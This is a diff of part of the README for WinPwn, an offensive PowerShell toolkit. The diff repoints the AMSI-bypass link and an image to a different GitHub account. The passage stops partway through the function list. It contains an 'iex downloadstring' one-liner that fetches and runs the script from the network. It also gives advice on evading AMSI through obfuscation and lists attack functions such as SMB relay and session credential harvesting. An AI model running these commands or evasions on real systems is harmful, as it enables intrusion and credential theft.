@@ -9,13 +9,13 @@ Just Import the Modules with:
 `Import-Module .\WinPwn.ps1` or 
 `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')`
 
-To bypass AMSI take one of the existing [bypass techniques](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), find the AMSI [trigger](https://github.com/RythmStick/AMSITrigger) and manually change it in the bypass function or encode the trigger string. Alternatively obfuscate the whole script. 
+To bypass AMSI take one of the existing [bypass techniques](https://github.com/kdandy/Amsi_Bypass_Powershell), find the AMSI [trigger](https://github.com/RythmStick/AMSITrigger) and manually change it in the bypass function or encode the trigger string. Alternatively obfuscate the whole script. 
 
 If you find yourself stuck on a windows system with no internet access - no problem at all, just use `Offline_Winpwn.ps1`, the most important scripts and executables are included.
 
 Functions available after Import:
 * #### `WinPwn` -> Menu to choose attacks:
-![alt text](https://raw.githubusercontent.com/kdandy/WinPwn/master/images/WinPwn.JPG)
+![alt text](https://github.com/kdandy/WinPwn/assets/50922642/140d472d-bc71-4074-b52f-f25da846c8f3)
 * #### `Inveigh` -> Executes Inveigh in a new Console window , SMB-Relay attacks with Session management (Invoke-TheHash) integrated
 * #### `SessionGopher` -> Executes Sessiongopher Asking you for parameters
 * #### `Kittielocal` ->
